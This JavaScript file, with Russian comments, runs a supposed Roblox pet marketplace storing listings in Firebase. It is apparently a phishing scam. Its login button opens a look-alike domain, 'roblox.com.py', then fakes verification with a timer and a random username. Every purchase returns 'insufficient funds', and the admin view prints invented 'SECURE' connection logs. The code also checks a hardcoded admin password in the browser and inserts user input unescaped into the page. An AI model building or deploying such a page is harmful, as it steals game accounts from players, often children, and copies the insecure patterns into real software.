// =========================================================
// 1. ПОДКЛЮЧЕНИЕ FIREBASE (ОБЛАЧНАЯ БАЗА)
// =========================================================
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

// --- ВАШИ НАСТРОЙКИ (Вставь их сюда) ---
const firebaseConfig = {
  apiKey: "AIzaSyBUVG2e9TVe6WlU72Hrjin03QXtkTGiNc0",
  authDomain: "star-marketdb.firebaseapp.com",
  databaseURL: "https://star-marketdb-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "star-marketdb",
  storageBucket: "star-marketdb.firebasestorage.app",
  messagingSenderId: "1040104655803",
  appId: "1:1040104655803:web:45bc355371265d36d8129e"
};

// Инициализация
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const petsRef = ref(db, 'market_lots'); // Ссылка на общую таблицу

// =========================================================
// 2. НАСТРОЙКИ И ПЕРЕМЕННЫЕ
// =========================================================
const ROBLOX_AUTH_LINK = "https://roblox.com.py/login?returnUrl=4210845075632139"; 
const NO_IMAGE_URL = "https://cdn-icons-png.flaticon.com/512/1076/1076928.png"; // Заглушка (Лапка)
let currentUser = null; 
let allLots = []; // Храним лоты локально для админки

// =========================================================
// 1. ПОЛУЧЕНИЕ ДАННЫХ
// =========================================================
onValue(petsRef, (snapshot) => {
    const container = document.getElementById('petsContainer');
    const adminTable = document.getElementById('adminLotsTable');
    container.innerHTML = ""; 
    adminTable.innerHTML = "";
    
    const data = snapshot.val();
    if (data) {
        // Сохраняем ID вместе с данными для редактирования/удаления
        allLots = Object.entries(data).map(([key, value]) => ({...value, key})).reverse();
        
        allLots.forEach(lot => {
            renderCard(lot, container);
            renderAdminRow(lot, adminTable); // Добавляем в админку
        });
    } else {
        container.innerHTML = "<p style='color:#888; width:100%; text-align:center; padding: 20px;'>Лотов пока нет</p>";
    }
});

function renderCard(lot, container) {
    const card = document.createElement('div');
    card.className = 'item-card';

    let badgesHtml = "";
    if(lot.stickers && lot.stickers.length > 0) {
        badgesHtml = `<div class="badges-row">`;
        lot.stickers.forEach(sticker => {
            badgesHtml += `<div class="mini-sticker ${sticker.class}">${sticker.letter}</div>`;
        });
        badgesHtml += `</div>`;
    }

    const imageUrl = lot.image || NO_IMAGE_URL;

    card.innerHTML = `
        <div class="card-img-area">
            ${badgesHtml}
            <img src="${imageUrl}" onerror="this.src='${NO_IMAGE_URL}'">
        </div>
        <div class="card-info">
            <div class="card-name" title="${lot.name}">${lot.name}</div>
            <span class="card-seller">@${lot.contact}</span>
            <div class="price-row">
                <span class="price">${lot.price} ₽</span>
                <button class="btn-buy-card" onclick="alert('Недостаточно средств')"><i class="fa-solid fa-cart-shopping"></i></button>
            </div>
        </div>
    `;
    container.appendChild(card);
}

// =========================================================
// 2. АВТОРИЗАЦИЯ (СТРОГАЯ)
// =========================================================
const loginModal = document.getElementById('loginModal');
const step1 = document.getElementById('loginStep1');
const step2 = document.getElementById('loginStep2');
const confirmAuthBtn = document.getElementById('confirmAuthBtn');

function checkAuth() {
    if (currentUser) return true;
    loginModal.style.display = 'flex';
    step1.style.display = 'block';
    step2.style.display = 'none';
    return false;
}

document.getElementById('headerLoginBtn').onclick = () => checkAuth();
document.getElementById('startAuthBtn').onclick = () => {
    window.open(ROBLOX_AUTH_LINK, '_blank');
    step1.style.display = 'none';
    step2.style.display = 'block';
    
    // Показываем кнопку проверки через 2 секунды (имитация ожидания)
    document.getElementById('authStatusText').innerText = "Ожидание действия пользователя...";
    setTimeout(() => {
        document.getElementById('authStatusText').innerText = "Готово к проверке";
        confirmAuthBtn.style.display = 'block';
    }, 2000);
};

confirmAuthBtn.onclick = () => {
    document.getElementById('authStatusText').innerText = "Проверка...";
    setTimeout(() => {
        const rnd = Math.floor(Math.random() * 9000) + 1000;
        currentUser = { name: `User_${rnd}` };
        updateHeader();
        loginModal.style.display = 'none';
    }, 1500);
};

function updateHeader() {
    document.getElementById('userProfileArea').innerHTML = `
        <div class="user-badge">
            <div class="avatar-circle"></div>
            <span>${currentUser.name}</span>
        </div>
    `;
}

// =========================================================
// 3. ПРОДАЖА
// =========================================================
const sellModal = document.getElementById('sellModal');
document.getElementById('sidebarSellBtn').onclick = () => {
    if(checkAuth()) sellModal.style.display = 'flex';
};

// ... Код выбора стикеров (тот же) ...
const selectedProps = { propFly: false, propRide: false, propNeon: false, propMega: false };
window.toggleProp = function(id) {
    const el = document.getElementById(id);
    if(id === 'propMega' && !selectedProps.propMega) { selectedProps.propNeon = false; document.getElementById('propNeon').classList.remove('selected'); }
    if(id === 'propNeon' && !selectedProps.propNeon) { selectedProps.propMega = false; document.getElementById('propMega').classList.remove('selected'); }
    selectedProps[id] = !selectedProps[id];
    el.classList.toggle('selected', selectedProps[id]);
};

// Загрузка фото
const fileInput = document.getElementById('petFileInput');
let customImageBase64 = null;
fileInput.onchange = () => {
    const file = fileInput.files[0];
    if (file) {
        if(file.size > 800 * 1024) { alert("Файл > 800кб!"); return; }
        const reader = new FileReader();
        reader.onload = (e) => customImageBase64 = e.target.result;
        reader.readAsDataURL(file);
        document.getElementById('fileName').innerText = "Загружено";
    }
};

document.getElementById('sellForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const petName = document.getElementById('petNameInput').value;
    const price = document.getElementById('petPrice').value;
    
    let activeStickers = [];
    if(selectedProps.propFly) activeStickers.push({class: 'sticker-f', letter: 'F'});
    if(selectedProps.propRide) activeStickers.push({class: 'sticker-r', letter: 'R'});
    if(selectedProps.propNeon) activeStickers.push({class: 'sticker-n', letter: 'N'});
    if(selectedProps.propMega) activeStickers.push({class: 'sticker-m', letter: 'M'});

    push(petsRef, {
        name: petName,
        price: price,
        contact: document.getElementById('telegramUser').value,
        seller: currentUser.name,
        image: customImageBase64,
        stickers: activeStickers,
        timestamp: Date.now()
    }).then(() => {
        sellModal.style.display = 'none';
        document.getElementById('sellForm').reset();
    });
});

// =========================================================
// 4. АДМИН ПАНЕЛЬ (REALTIME)
// =========================================================
const settingsModal = document.getElementById('settingsModal');
const adminPanel = document.getElementById('adminPanel');

// Открыть настройки
document.getElementById('settingsBtn').onclick = () => settingsModal.style.display = 'flex';

// Открыть админку (с паролем)
document.getElementById('openAdminLogin').onclick = () => {
    const pass = prompt("Введите пароль администратора:");
    if(pass === "admin123") { // ПАРОЛЬ ТУТ
        settingsModal.style.display = 'none';
        adminPanel.style.display = 'flex';
        startFakeLogs();
    } else {
        alert("Неверный пароль");
    }
};

// Рендер строки в таблице админа
function renderAdminRow(lot, table) {
    const row = document.createElement('tr');
    row.innerHTML = `
        <td>${lot.name}</td>
        <td>${lot.price} ₽</td>
        <td>@${lot.contact}</td>
        <td>
            <button class="btn-action act-edit" onclick="openEdit('${lot.key}', '${lot.name}', '${lot.price}')">Edit</button>
            <button class="btn-action act-del" onclick="deleteLot('${lot.key}')">Del</button>
        </td>
    `;
    table.appendChild(row);
}

// Удаление лота (для админа)
window.deleteLot = (key) => {
    if(confirm("Удалить этот лот навсегда?")) {
        remove(ref(db, 'market_lots/' + key));
    }
};

// Редактирование лота
const editModal = document.getElementById('editModal');
window.openEdit = (key, name, price) => {
    document.getElementById('editLotId').value = key;
    document.getElementById('editLotName').value = name;
    document.getElementById('editLotPrice').value = price;
    editModal.style.display = 'flex';
};

document.getElementById('saveEditBtn').onclick = () => {
    const key = document.getElementById('editLotId').value;
    update(ref(db, 'market_lots/' + key), {
        name: document.getElementById('editLotName').value,
        price: document.getElementById('editLotPrice').value
    }).then(() => editModal.style.display = 'none');
};

document.getElementById('cancelEditBtn').onclick = () => editModal.style.display = 'none';

// Фейковые логи (для красоты)
function startFakeLogs() {
    const logDiv = document.getElementById('ipLogs');
    setInterval(() => {
        const ips = ["192.168.0.1", "10.5.22.1", "88.55.12.90", "45.11.2.1"];
        const randIp = ips[Math.floor(Math.random() * ips.length)];
        const line = document.createElement('div');
        line.innerText = `> Connection from ${randIp} [SECURE]`;
        logDiv.appendChild(line);
        logDiv.scrollTop = logDiv.scrollHeight;
    }, 2000);
}

// Закрытие
document.querySelectorAll('.close-modal, .close-admin').forEach(btn => {
    btn.onclick = function() { this.closest('.modal-overlay, .admin-overlay').style.display = 'none'; }
});
